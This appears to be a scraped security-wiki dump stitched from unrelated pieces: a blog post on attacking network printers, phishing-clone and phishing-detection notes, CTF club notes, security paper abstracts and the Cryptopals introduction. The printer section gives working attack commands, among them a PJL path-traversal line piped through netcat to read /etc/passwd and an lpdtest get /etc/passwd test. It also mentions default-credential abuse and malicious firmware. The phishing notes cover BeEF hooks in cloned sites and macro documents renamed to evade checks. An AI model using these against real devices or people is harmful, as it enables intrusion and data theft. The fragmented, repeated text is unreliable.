+-----------------------------+--+ | | | | | PJL, PML | | | | | | +------------------------+ | | | | Page descr. langs. | | | | +------------------------+---+ | | | | | | | | | PS, PCL, PDF, XPS, ... | | | | | | | | | +----------------------------+ | | +--------------------------------+ | +----------------------------------+ Note: This diagram might be incomplete! =The network printing protocol acts as a channel to deploy print jobs, which either contain the page description language directly or first invoke a printer/job control language! Let\u2019s take a look at each of those sections in the diagram above more closely and cover some fundamentals. Fundamentals Firmware Printer use, in my experience a couple of different operating systems for embedded devices. I\u2019ll list a few of them here, but won\u2019t really dive into them, since it would go beyond the scope of this article. Basic but slimmed down GNU/Linux, often custom tailored, WindRiver Linux 54 , VxWorks 38 , ThreadX 28 . With the different, but limited pool of printers I\u2019ve had access to all of them had some things in common in the end. slimmed down instruction/command set - reduced functionality, \u2018legacy kernels\u2019 - often around kernel version 2.6.XYZ, might include \u2018hidden\u2019 functionality, which can be enabled through a little patch - e.g.: ssh files are there, but need to be enabled in config files, ssh is more present in printers designed for offices, compared to home printers for some reason, sometimes the way the firmware is stored is hilarious - e.g.: on a SD card you can remove/switch within 30 seconds of physical access These facts show that printers might be vulnerable to certain attacks, but still these attacks often are made more \u2018complicated\u2019, because certain functions aren\u2019t even there or somehow have to get enabled through (remote) file system writes\u2026 Next a wild bunch of protocols is used for communication between Printers, print servers, desktop PCs and even internally within a printer. Let\u2019s take a look! Network printing protocols To summarize it right away there are a bunch of \u2018exotic\u2019 protocols for network printing (NCP or AppleTalk for example) To explain and mention them all here would be too much again. If anyone is interested in some specifics or a follow up post I\u2019d answer any questions there. In the Windows world, SMB/CIFS printer are popular. The most common printing protocols supported directly by network printers however are LPD, IPP, and raw port 9100 printing, which I will explain a bit more in depth now. Furthermore, some devices support printing over generic protocols such as FTP or HTTP file uploads as well. LPD LPD is short for \u2018Line Printer Daemon\u2019-protocol. It runs on port 515/TCP and can be accessed by using \u2018lpr\u2019 over the CLI. To print things, the client sends a control file defining job/username and a data file containing the actual data to be printed. IPP IPP is an extendable protocol and based on HTTP, so it inherits all existing security features like basic authentication and SSL/TLS encryption. To submit a print job, a HTTP POST request is sent to the IPP server, which listens on 631/TCP. For anyone wondering CUPS is an IPP implementation, which is a default printing system in many Linux distributions and macOS X. SMB SMB, short for \u2018Server Message Block\u2019 is an application-layer network protocol, which handles file and printer sharing. It\u2019s used by default on Windows. Usually it runs on 445/TCP. Port 9100 Also known as \u2018raw printing\u2019, since it makes use of connecting to 9100/TCP of a network printer. It is the default method used by CUPS and the Windows printing architecture. Here all data sent is directly processed by the printing device, just like a parallel connection over TCP. In contrast to LPD, IPP and SMB interpreted printer control/page description languages, this one here is capable of sending direct feedback to the client, including status and error messages. So we have a bidirectional channel here, which directly can give us access to results of the Printer control languages! Printer Control Languages Basically a job control language manages settings like output trays for the current job. It often just sits in between the printing protocol and the page description language. Printer control and management languages are designed to affect not only a single print job but the device as a whole. I\u2019m not too knowledgeable here but the two most basic ones are listed below. SNMP SNMP, short for \u2018Simple Network Management Protocol\u2019 listens on 161/UDP. Was designed to manage network components PJL PJL, short for \u2018Printer Job Language\u2019 is the kinda de-facto standard now Can be used to manipulate general settings, also with permanent changes. There are many dialects as vendors tend to support only a subset of the commands listed in the PJL reference and instead prefer to add proprietary ones. PJL is also used to set the file format of the actual print data to follow, which makes it interesting for various attacks. Page Description Languages (PDL) This one basically specifies how the actual document will look like appearance wise. Here comes the printer driver into play which kinda translate the file to be printed into a PDL that is understood by the printer. PostScript (PS) Is well known and made by Adobe and is widely used as a PDL. PS is capable of far more than just defining the appearance of the document and handling vector graphics though. That\u2019s why, when used correctly, PS can be used for a variety of attacks such as denial of service (for example, through infinite loops), print job manipulation and retention as well as gaining access to the printer\u2019s file system. PCL As a minimalist page description language supported by a wide variety of vendors and devices. Is also a de-facto Standard nowadays. It\u2019s also not intended to get direct access to the underlying filesystem. So it\u2019s not that well suited for exploitation purposes, but still has it\u2019s place for such purposes as well. Possible Exploits Who would put a printer on the Internet? I just leave this data as a first expression here shodan count port:9100 pjl 29111 [7/07/20 7:42:13] dev@ops shodan count port:515 lpd 50607 [7/07/20 7:42:46] dev@ops shodan count port:631 ipp 90760 [7/07/20 7:43:10] dev@ops shodan count port:161 snmp 7876 Data from: 07.07.2020 Attack Vectors Remote As easily seen above a lot of printers are connected to the Internet through port 9100, which make them attackable. You either know the IP or can just scan for some in your neighborhood radius/ check shodan. Once you have some you might get a SSH connection going. Often standard login credentials are still used, which you can easily scrape from the Internet\u2026 Inside job If you have physical access to the printer you can also plug in an USB drive or even a SD card. Possible Mayhem one can cause\u2026 So now we\u2019re kinda back to the linked topic at the beginning of the small web series directed by HP. So how realistic are the shown scenarios? DoS Transmission Channel - basically block the/one printing port to keep the printer busy and don\u2019t print anything anymore. Document processing - manipulate a Document via PDL and let the printer interpret it\u2026 e.g.: an infinite loop in PS. Physical damage - malware causing writes on NVRAM chips which have a life expectancy of ~10^5 writes 30 . Privilege Escalation Factory defaults - reset to factory defaults to bypass authentication. Accounting bypass - similar thing here, printing without authentication. Print Job Access Print job retention - Try to find stored print jobs on the printer and extract those. Print job manipulation - Alter print jobs. You can imagine the possible mayhem caused itself. Information Disclosure Memory access - may lead to finding sensitive data like passwords or printed documents. File system access - potentially retrieve sensitive information like configuration files or stored print jobs. Credential disclosure - brute force attacks against changed default login credentials to gain access Code Execution Buffer overflows - printers provide additional languages and network services, potentially prone to this kind of attack Firmware updates - it is common for printers to deploy firmware updates as ordinary print jobs cough malicious firmware cough Software packages - \u2018custom tailored and manipulated printer apps\u2019 Misc Malware - target network printers and spread it in local networks to other peers. possible scenarios Depending on the planned attack and possible access one has a variety of attack vectors. One need more planning than others. Some need physical access and some can be done from remote. Combinations of those are easily possible! For example issuing a malicious firmware update via a simple print job (possible case: no authentication needed), which extracts sensitive data and renders the printer useless. -Printer \u2018ransomware\u2019 may be a thing, even if it sounds kinda weird. So to conclude this section, I think the shown attacks in the videos were presented a tad to \u2018flashy\u2019, but are indeed possible depending on the printers and network they are placed in. Tools A lot of these techniques mentioned above need some serious work or knowledge about the underlying structure ( e.g.: used PDL, PCL). Even though these might be fairly easily found out using manuals or online search it\u2019s still a hassle and extra work. So people already made our lifes more easy by providing tools for almost all tasks mentioned above :). BeEF The Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. This is not really printer specific, but it is a framework to implement cross-site printing 48 functionality. Praeda Praeda - \u201cAn Automated Printer Data Harvesting Tool\u201d written in perl. Also a tool to help pentesters to gather usable data during security assessment jobs. Praeda systematically collects sensitive information from the printer\u2019s embedded web server. This includes device passwords, usernames, email addresses which might be available publicly on the web interface. PRET 328 This one is real nifty tool written in python to check for basically every attack vector I mentioned above. It tries to connect to the printer via network or USB and tries to exploit the used printer languages, currently supported are PS, PJL and PCL. When successfully connected one has a ton of available commands. A full list can be found on the Github, linked below. LES Linux Exploit Suggester is a neat little perl script, which gives some options for possible exploits depending on your kernel. As stated above the kernel versions for embedded operating systems are often far lower, compared to current linux based desktop or server distributions. So old, usually fixed exploit techniques might still be viable here! Note: It is likely, that perl is not present in it\u2019s full range and copying it to a printer is extra work. Luckily one can run simply run in a desktop environment and specifying the kernel you want to exploit My home printer - a journey to find a way in! Ok what is a basic plan to concentrate on when trying to exploit a printer? I\u2019ve given a lot of theory until this point, as well as some \u201cDo\u2019s\u201d and \u201cMights\u201d. Maybe you\u2019ve got some ideas on your own already, but here\u2019s a little experimental journey from me. So first thing that is obvious is to check for open ports and an OS fingerprint. Luckily we have nmap. Nmap is bae for this. Where\u2019s the door? $ sudo nmap 192.168.1.108 Starting Nmap 7.01 ( https://nmap.org ) at 2017-09-11 20:13 CEST Nmap scan report for 192.168.1.108 Host is up (0.031s latency).

It is running an older Linux as well, so no big surprise there! No open 22/TCP port though. So causing mayhem on the file system is not possible as of now. PRET and done? I\u2019ve praised PRET quite a bit above, so let\u2019s give it a try to check if my Epson printer has a nice, hopefully standard set of supported printer languages! $ python pret.py 192.168.1.108 -s PS Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PS support: not found $ $ python pret.py 192.168.1.108 -s Pjl Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PJL support: not found $ $ python pret.py 192.168.1.108 -s PCL Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PCL support: not found $ So no SSH and not even a standard version here\u2026 Most likely the result of my vendor using some exotic stuff again and not keeping things simple \u2026 Anyway using PRET is easy and self explanatory, once connected a help function will give you an overview of available stuff! From checking the file-system. creating directories, changing configuration files or even dumping the whole NVRAM. PRET can do it all (in theory that is ). After trying a few things to find a way to make PRET work for me I trashed that idea for now and moved on! LES So I wanted to have some fun now after the two disappointing results :D.

Manual PJL Injection So I thought why not check for PJL again and try invoking some command strings manually in combination with netcat as a listener! So I tried using: echo \"@PJL FSUPLOAD FORMAT:BINARY NAME=\"../../etc/passwd\" OFFSET=0 SIZE=648\" | nc -v -v 192.168.1.108 9100 # If successful this should display the */etc/passwd* file. or echo \"@PJL INFO ID\" | nc -v -v 192.168.1.108 9100 # If successful this should get the *printer\u2019s device information* as well as other PJL command injecting techniques, but my printer is not accepting any of these. It\u2019s not reacting at all to this kind of \u2018attack\u2019\u2026 I\u2019m not knowledgeable enough to launch this with PS and PCL as well, because their command syntax differs greatly (obviously). I\u2019m remaining with a note to search for PS and PCL attack strings. A PRET test script to the rescue? So PRET doesn\u2019t work for my home printer as seen above. Interestingly I found that there is a script \u201chidden\u201d within the PRET source folder called \u201clpdtest.py\u201d It can test for known, but older (like really older) vulnerabilities within the Line Printer Daemon, listed here 60 . This involves some basic tests: \u2018get\u2019 Test Trying to get (aka print) a file from printer\u2019s file system. $ lpdtest.py printer get /etc/passwd $ lpdtest.py printer get \u2026/\u2026/\u2026/etc/passwd etc\u2026 \u2018in\u2019 Test This test is for fuzzing around with user input (hostname,username, jobname, filenames, etc.).

My printer spit out a few pages with lines like \u201cIf you can read this lpdtest.py XYZ failed!\u201d So the result here some wasted paper and ink\u2026 Summary Why Printer Exploitation? (most) printers are already full blown computers! Printer as port/network/exploits scanner Computing/hash-cracking/sniffing Malware upload \u201cStealth\u201d/\u201cuncleanable\u201d command and control Unencrypted data theft Afterthoughts How many people would expect their printers is infected? How many users/admins/security-auditors audit and hard secure their network printers? How many persons or anti malware products could clean such a malware? \u2026? Outlook and closing words If I get the hands on some nicer printer I will deliver some exploit stuff later on I promise. If I get some more time to get a breakdown of my current home printer so I can take a look under the hood and to figure something out. An example here would be to capture a firmware update and trying to unpack/reverse that one. This would take a lot more time and preparation of my part, which would cause serious delay to this article as well. So I\u2019m keeping it rather open ended now, but I hope I could inspire some minds here to take a closer look as well. Furthermore I hope this article reached the people who were interested and were able learn some things. So if you want to try to exploit your own device, just try it out! Remember: Find a way into the system, Check for the used printer languages and try code injection techniques for these, Try dumping the file system directory structure from the web interface, Upload self created \u201cmalicious\u201d firmware if it is supported, Find a new way I\u2019m looking forward to feedback and improvement suggestions.

Note that you can add also some payloads to the cloned website like a BeEF hook to \"control\" the tab of the user. There are different tools you can use for this purpose: wget wget -mk -nH goclone #https://github.com/imthaghost/goclone oclone <url> Social Engineering Toolit #https://github.com/trustedsec/social-engineer-toolkit Detecting Phising Introduction In order to detect a phishing attempt it's important to understand the phishing techniques that are being used nowadays . In the parent page of this post you can find this information, so if you aren't aware of which techniques are being used today I recommend you to go to the parent page and read at least that section. This post is based in the idea that the attackers will try to somehow mimic or used the victim's domain name . If your domain is called example.com and you receive a phishing that is using a completely different domain name for some reason like youwonthelottery.com , this techniques aren't going to uncover it. Domain name variations It's kind of easy to uncover those phishing attempts that will use a similar domain name inside the email. It's enough to generate a list of the most probable phishing names that an attacker may use and check if it's registered or just check if there is any IP using it. Finding suspicions domains For this purpose you can use any of the following tools. Note that these tolls will also perform DNS requests automatically to check if the domain has any IP assigned to it: * dnstwist * urlcrazy **** Bitflipping In the world of computing, everything is stored in bits (zeros and ones) in memory behind the scenes. This applies to domains too. For example, windows.com becomes 01110111... in the volatile memory of your computing device. However, what if one of these bits got automatically flipped due to a solar flare, cosmic rays, or a hardware error? That is one of the 0's becomes a 1 and vice versa. Applying this concept to DNS request, it's possible that the domain requested that arrives to the DNS server isn't the same as the domain initially requested. For example a 1 bit modification in the domain microsoft.com can transform it into windnws.com. Attackers may register as many bit-flipping domains as possible related to the victim in order to redirect legitimate users to their infrastructure . For more information read https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/ All possible bit-flipping domain names should be also monitored. Basic checks Once you have a list of potential suspicions domain names you should check them (mainly the ports HTTP and HTTPS) to see if they are using some login form similar to someone of the victim's domain. You could also check the port 3333 to see if it's open and running an instance of gophish . It's also interesting to know how old each discovered suspicions domain is , the younger it's the riskier it is. You can also get screenshots of the HTTP and/or HTTPS suspicious web page to see if it's really suspicious and in that case access it to take a deeper look . Advanced checks If you want to go one step further I would recommend you to monitor those suspicious domains and search for more once in a while (every day? it only takes a few seconds/minutes). You should also check the open ports of the related IPs and search for instances of gophish or similar tools (yes, attackers also make mistakes) and monitor the HTTP and HTTPS web pages of the suspicions domains and subdomains to see if they have copied any login form from the victims web pages. In order to automate this I would recommend to to have a list of login forms of the victims domains, spider the suspicions web pages and compare each login form found inside the suspicions domains with each login form of the victim's domain using something like ssdeep . If you have located the login forms of the suspicions domains you can try to send junk credentials and check if it's redirecting you to the victims domain . Domain names using keywords The parent page also mentions a domain name variation technique that consist on putting the victim's domain name inside a bigger domain (e.g. paypal-financial.com for paypal.com). Certificate Transparency It's not possible to take the previous \"Brute-Force\" approach but it's actually possible to uncover this phishing attempts also thanks to certificate transparency. Every time a certificate is emitted by a CA, the details are made public. This means that reading the certificate transparency or even monitoring it, it's possible to find domains that are using a keyword inside it's name For example, if attackers generates a certificate of https://paypal-financial.com , seeing the certificate it's possible to find the keyword \"paypal\" and know that that suspicions email is being used. The post https://0xpatrik.com/phishing-domains/ suggest that you can use Censys to search for certificates affecting a specific keyword and filter by date (only \"new\" certificates) and by the CA issuer \"Let's Encrypt\": However, you can do \"the same\" using the free web crt.sh . You can search for the keyword and the filter the results by date and CA if you whish. Using this last option you can even use the field Matching Identities to see if any identity from the real domain matches any of the suspicious domain (note that a suspicious domain can be a false positive). Another alternative is the fantastic project called CertStream . CertStream provides a real-time stream of newly generated certificates which you can use to detect specified keywords in (near) real-time. In fact, there is a project called phishing_catcher that does just like that. New domains One last alternative is to gather a list of newly registered domains for some TLDs ( Whoxy provides such service) and check the keywords in these domains . However, long domains usually uses one or more subdomains, therefore the keyword won't appear inside the FLD and you won't be able to find the phishing subdomain. Phishing Documents Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened. Usually Word files containing macros uses the .docm extension. However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution. The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.). You can use the following command to check which extensions are going to be executed by some Office programs: assoc | findstr /i \"word excel powerp\" DOCX files referencing a remote template (File \u2013Options \u2013Add-ins \u2013Manage: Templates \u2013Go) that includes macros can \u201cexecute\u201d macros as well.

You should also check the open ports of the related IPs and search for instances of gophish or similar tools (yes, attackers also make mistakes) and monitor the HTTP and HTTPS web pages of the suspicions domains and subdomains to see if they have copied any login form from the victims web pages. In order to automate this I would recommend to to have a list of login forms of the victims domains, spider the suspicions web pages and compare each login form found inside the suspicions domains with each login form of the victim's domain using something like ssdeep . If you have located the login forms of the suspicions domains you can try to send junk credentials and check if it's redirecting you to the victims domain .","title":"Advanced checks"},{"location":"CS315/Week%209/#domain-names-using-keywords","text":"The parent page also mentions a domain name variation technique that consist on putting the victim's domain name inside a bigger domain (e.g. paypal-financial.com for paypal.com).","title":"Domain names using keywords"},{"location":"CS315/Week%209/#certificate-transparency","text":"It's not possible to take the previous \"Brute-Force\" approach but it's actually possible to uncover this phishing attempts also thanks to certificate transparency. Every time a certificate is emitted by a CA, the details are made public. This means that reading the certificate transparency or even monitoring it, it's possible to find domains that are using a keyword inside it's name For example, if attackers generates a certificate of https://paypal-financial.com , seeing the certificate it's possible to find the keyword \"paypal\" and know that that suspicions email is being used. The post https://0xpatrik.com/phishing-domains/ suggest that you can use Censys to search for certificates affecting a specific keyword and filter by date (only \"new\" certificates) and by the CA issuer \"Let's Encrypt\": However, you can do \"the same\" using the free web crt.sh . You can search for the keyword and the filter the results by date and CA if you whish. Using this last option you can even use the field Matching Identities to see if any identity from the real domain matches any of the suspicious domain (note that a suspicious domain can be a false positive). Another alternative is the fantastic project called CertStream . CertStream provides a real-time stream of newly generated certificates which you can use to detect specified keywords in (near) real-time. In fact, there is a project called phishing_catcher that does just like that.","title":"Certificate Transparency"},{"location":"CS315/Week%209/#new-domains","text":"One last alternative is to gather a list of newly registered domains for some TLDs ( Whoxy provides such service) and check the keywords in these domains . However, long domains usually uses one or more subdomains, therefore the keyword won't appear inside the FLD and you won't be able to find the phishing subdomain.","title":"New domains"},{"location":"CS315/Week%209/#phishing-documents","text":"Microsoft Word performs file data validation prior to opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard.

However, it's possible to rename the file changing the file extension and still keep their macro executing capabilities. For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.

In the meanwhile, we have won Redbud for continuous 3 times. Still, we have some areas to improve. First of all, all of our scores are from the Web category. PWN is still an area we should improve. The Rev and Crypto of the codegate are very difficult. CTFshow Congratulations to Frankss! Looking forward to your next rank 1 in CTF! CTF Platform In the past very long time, we use CTFd online collocation system to deploy our platform. The CTFd online service is limited now. The black box of CTFd doesn't offer us direct interaction with the source code and the plugins. In order to make further improvements, we are going to switch back to the local VPS deployment. We have 2 plans: A. use my personal VPS server. The VPS is in Hong Kong with 8 CPU cores and 16 GB of memory. The access of VPS is open to the public network. In order to deploy in my VPS, we need to assign an SSL certification and allocate a domain name service to the docker image. B. use COMPASS server. The COMPASS server is very high performance. To use the COMPASS's Detroit server, we can directly use the compass.sustech.edu.cn domain name. But the access is limited to the campus. If we want to let users outside the SUSTech access, we need to deploy a jump service. We need to assign the maintenance of the CTF platform to our members. If you are interested, please let me know. The work of the maintenance involves: make sure the platform is online and the docker image is working properly. make sure all the challenge container is online. analysis of the network traffic logs to prevent attackers. Wiki The Wiki page is critical for our public information. We have updated our Wiki page several times. https://wiki.compass.college/member/ On the members' page, we have all of our members' cards.

SU team is a united team of members in the universities (we are a university team with all of us from SUSTech). SU team is established in 2016, and be famous in 2022. The cooperation experience from SU: Collaborate with the university club. Communication with members, teachers from other teams. An experienced member leads a new member.

For instance, for the RNN-2-32 model on the MNIST sequence dataset, the robustness bound certified by Cert-RNN is on average 1.86 times larger than that by POPQORN. Besides certifying the robustness of given RNNs, Cert-RNN also enables a range of practical applications including evaluating the provable effectiveness for various defenses (i.e., the defense with a larger robustness region is considered to be more robust), improving the robustness of RNNs (i.e., incorporating Cert-RNN with verified robust training) and identifying sensitive words (i.e., the word with the smallest certified robustness bound is considered to be the most sensitive word in a sentence), which helps build more robust and interpretable deep learning systems.

Existing work targets a centralized network model in which all messages are routed through a single server, which is trusted to provide a consistent total order on updates to the group state. In this paper we adapt secure group messaging for decentralized networks that have no central authority. Servers may still optionally be used, but they are trusted less. We define decentralized continuous group key agreement (DCGKA), a new cryptographic primitive encompassing the core of a decentralized secure group messaging protocol; we give a practical construction of a DCGKA protocol and prove its security; and we describe how to construct a full messaging protocol from DCGKA. In the face of device compromise our protocol achieves forward secrecy and post-compromise security.

In the face of device compromise our protocol achieves forward secrecy and post-compromise security. We evaluate the performance of a prototype implementation, and demonstrate that our protocol has practical efficiency.","title":"Abstract"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#related","text":"GitHub repo: https://github.com/trvedata/key-agreement","title":"Related"},{"location":"Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/#download","text":"PDF: Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees.pdf","title":"Download"},{"location":"Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/","text":"Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference [Submitted on 12 May 2021 ( v1 ), last revised 21 May 2021 (this version, v2)] Authors: Xiaotao Feng (1), Ruoxi Sun (2), Xiaogang Zhu (1), Minhui Xue (2), Sheng Wen (1), Dongxi Liu (3), Surya Nepal (3), Yang Xiang (1) ((1) Swinburne University of Technology, (2) The University of Adelaide, (3) CSIRO Data61) Comments: Accepted to ACM CCS 2021 Subjects: Cryptography and Security (cs.CR) Abstract The proliferation of Internet of Things (IoT) devices has made people's lives more convenient, but it has also raised many security concerns. Due to the difficulty of obtaining and emulating IoT firmware, the black-box fuzzing of IoT devices has become a viable option. However, existing black-box fuzzers cannot form effective mutation optimization mechanisms to guide their testing processes, mainly due to the lack of feedback. It is difficult or even impossible to apply existing grammar-based fuzzing strategies. Therefore, an efficient fuzzing approach with syntax inference is required in the IoT fuzzing domain. To address these critical problems, we propose a novel automatic black-box fuzzing for IoT firmware, termed Snipuzz. Snipuzz runs as a client communicating with the devices and infers message snippets for mutation based on the responses. Each snippet refers to a block of consecutive bytes that reflect the approximate code coverage in fuzzing. This mutation strategy based on message snippets considerably narrows down the search space to change the probing messages. We compared Snipuzz with four state-of-the-art IoT fuzzing approaches, i.e., IoTFuzzer, BooFuzz, Doona, and Nemesys. Snipuzz not only inherits the advantages of app-based fuzzing (e.g., IoTFuzzer, but also utilizes communication responses to perform efficient mutation. Furthermore, Snipuzz is lightweight as its execution does not rely on any prerequisite operations, such as reverse engineering of apps. We also evaluated Snipuzz on 20 popular real-world IoT devices. Our results show that Snipuzz could identify 5 zero-day vulnerabilities, and 3 of them could be exposed only by Snipuzz. All the newly discovered vulnerabilities have been confirmed by their vendors.

Shin, Jong-Min Choi, Junbum Shin Abstract While privacy laws and regulations require apps and services to disclose the purposes of their data collection to the users (i.e., why do they collect my data?), the data usage in an app\u2019s actual behavior does not always comply with the purposes stated in its privacy policy. Automated techniques have been proposed to analyze apps\u2019 privacy policies and their execution behavior, but they often overlooked the purposes of the apps\u2019 data collection, use and sharing. To mitigate this oversight, we propose PurPliance, an automated system that detects the inconsistencies between the data-usage purposes stated in a natural language privacy policy and those of the actual execution behavior of an Android app. PurPliance analyzes the predicate-argument structure of policy sentences and classifies the extracted purpose clauses into a taxonomy of data purposes. Purposes of actual data usage are inferred from network data traffic. We propose a formal model to represent and verify the data usage purposes in the extracted privacy statements and data flows to detect policy contradictions in a privacy policy and flow-to-policy inconsistencies between network data flows and privacy statements. Our evaluation results of end-to-end contradiction detection have shown PurPliance to improve detection precision from 19% to 95% and recall from 10% to 50% compared to a state-of-the-art method. Our analysis of 23.1k Android apps has also shown PurPliance to detect contradictions in 18.14% of privacy policies and flow-topolicy inconsistencies in 69.66% of apps, indicating the prevalence of inconsistencies of data practices in mobile apps.

Many programs of the kind (PEID, PE tools) allow to use third-party signatures. Unfortunately, those signatures scan only bytes by the pre-set mask, and it is not possible to specify additional parameters. As the result, false triggering often occur. More complicated algorithms are usually strictly set in the program itself. Hence, to add a new complex detect one needs to recompile the entire project. No one, except the authors themselves, can change the algorithm of a detect. As time passes, such programs lose relevance without the constant support. Detect It Easy has totally open architecture of signatures. You can easily add your own algorithms of detects or modify those that already exist. This is achieved by using scripts. The script language is very similar to JavaScript and any person, who understands the basics of programming, will understand easily how it works. Possibly, someone may decide the scripts are working very slow. Indeed, scripts run slower than compiled code, but, thanks to the good optimization of Script Engine, this doesn't cause any special inconvenience. The possibilities of open architecture compensate these limitations. DIE exists in three versions. Basic version (\"DIE\"), Lite version (\"DIEL\") and console version (\"DIEC\"). All the three use the same signatures, which are located in the folder \"db\". If you open this folder, nested sub-folders will be found (\"Binary\", \"PE\" and others). The names of sub-folders correspond to the types of files. First, DIE determines the type of file, and then sequentially loads all the signatures, which lie in the corresponding folder.

This site will host all eight sets of our crypto challenges, with solutions in most mainstream languages. But: it doesn't yet. If we waited to hit \"publish\" until everything was here, we might be writing this in 2015. So we're publishing as we go. In particular: give us a little time on the challenge solutions. We can't introduce these any better than Maciej Ceglowski did, so read that blog post first. We've built a collection of 48 exercises that demonstrate attacks on real-world crypto. This is a different way to learn about crypto than taking a class or reading a book. We give you problems to solve. They're derived from weaknesses in real-world systems and modern cryptographic constructions. We give you enough info to learn about the underlying crypto concepts yourself. When you're finished, you'll not only have learned a good deal about how cryptosystems are built, but you'll also understand how they're attacked. What Are The Rules? There aren't any! For several years, we ran these challenges over email, and asked participants not to share their results. The honor system worked beautifully! But now we're ready to set aside the ceremony and just publish the challenges for everyone to work on. How Much Math Do I Need To Know? If you have any trouble with the math in these problems, you should be able to find a local 9th grader to help you out. It turns out that many modern crypto attacks don't involve much hard math. How Much Crypto Do I Need To Know? None. That's the point. So What Do I Need To Know? You'll want to be able to code proficiently in any language. We've received submissions in C, C++, Python, Ruby, Perl, Visual Basic, X86 Assembly, Haskell, and Lisp. Surprise us with another language. Our friend Maciej says these challenges are a good way to learn a new language, so maybe now's the time to pick up Clojure or Rust. What Should I Expect? Right now, we have eight sets. They get progressively harder. Again: these are based off real-world vulnerabilities. None of them are \"puzzles\". They're not designed to trip you up. Some of the attacks are clever, though, and if you're not familiar with crypto cleverness... well, you should like solving puzzles. An appreciation for early-90's MTV hip-hop can't hurt either. Can You Give Us A Long-Winded Indulgent Description For Why You'Ve Chosen To Do This? It turns out that we can. If you're not that familiar with crypto already, or if your familiarity comes mostly from things like Applied Cryptography, this fact may surprise you: most crypto is fatally broken. The systems we're relying on today that aren't known to be fatally broken are in a state of just waiting to be fatally broken. Nobody is sure that TLS 1.2 or SSH 2 or OTR are going to remain safe as designed. The current state of crypto software security is similar to the state of software security in the 1990s. Specifically: until around 1995, it was not common knowledge that software built by humans might have trouble counting. As a result, nobody could size a buffer properly, and humanity incurred billions of dollars in cleanup after a decade and a half of emergency fixes for memory corruption vulnerabilities. Counting is not a hard problem. But cryptography is. There are just a few things you can screw up to get the size of a buffer wrong. There are tens, probably hundreds, of obscure little things you can do to take a cryptosystem that should be secure even against an adversary with more CPU cores than there are atoms in the solar system, and make it solveable with a Perl script and 15 seconds. Don't take our word for it: do the challenges and you'll see. People \"know\" this already, but they don't really know it in their gut, and we think the reason for that is that very few people actually know how to implement the best-known attacks. So, mail us, and we'll give you a tour of them. How do I start? Start here! Who did this?

But: it doesn't yet. If we waited to hit \"publish\" until everything was here, we might be writing this in 2015. So we're publishing as we go. In particular: give us a little time on the challenge solutions. We can't introduce these any better than Maciej Ceglowski did, so read that blog post first. We've built a collection of 48 exercises that demonstrate attacks on real-world crypto. This is a different way to learn about crypto than taking a class or reading a book. We give you problems to solve. They're derived from weaknesses in real-world systems and modern cryptographic constructions. We give you enough info to learn about the underlying crypto concepts yourself. When you're finished, you'll not only have learned a good deal about how cryptosystems are built, but you'll also understand how they're attacked.","title":"Work in progress."},{"location":"Website/Platform/Cryptopals/#what-are-the-rules","text":"There aren't any!

They get progressively harder. Again: these are based off real-world vulnerabilities. None of them are \"puzzles\". They're not designed to trip you up. Some of the attacks are clever, though, and if you're not familiar with crypto cleverness... well, you should like solving puzzles. An appreciation for early-90's MTV hip-hop can't hurt either.","title":"What Should I Expect?"},{"location":"Website/Platform/Cryptopals/#can-you-give-us-a-long-winded-indulgent-description-for-why-youve-chosen-to-do-this","text":"It turns out that we can. If you're not that familiar with crypto already, or if your familiarity comes mostly from things like Applied Cryptography, this fact may surprise you: most crypto is fatally broken. The systems we're relying on today that aren't known to be fatally broken are in a state of just waiting to be fatally broken. Nobody is sure that TLS 1.2 or SSH 2 or OTR are going to remain safe as designed. The current state of crypto software security is similar to the state of software security in the 1990s. Specifically: until around 1995, it was not common knowledge that software built by humans might have trouble counting. As a result, nobody could size a buffer properly, and humanity incurred billions of dollars in cleanup after a decade and a half of emergency fixes for memory corruption vulnerabilities. Counting is not a hard problem. But cryptography is. There are just a few things you can screw up to get the size of a buffer wrong. There are tens, probably hundreds, of obscure little things you can do to take a cryptosystem that should be secure even against an adversary with more CPU cores than there are atoms in the solar system, and make it solveable with a Perl script and 15 seconds. Don't take our word for it: do the challenges and you'll see. People \"know\" this already, but they don't really know it in their gut, and we think the reason for that is that very few people actually know how to implement the best-known attacks. So, mail us, and we'll give you a tour of them.","title":"Can You Give Us A Long-Winded Indulgent Description For Why You'Ve Chosen To Do This?"},{"location":"Website/Platform/Cryptopals/#how-do-i-start","text":"Start here!","title":"How do I start?"},{"location":"Website/Platform/Cryptopals/#who-did-this","text":"Thomas Ptacek (@tqbf) Sean Devlin (@spdevlin) Alex Balducci (@iamalexalright) Marcin Wielgoszewski (@marcinw) Cryptopals is maintained and expanded (from Set 8 on) by Sean Devlin, in conjunction with the Cryptography Services Team at NCC Group .

That's say, you need to create a room and deploy machine before hacking. All target environments are on the thm's cloud server and you don't need to configure local machine to deploy target environment.

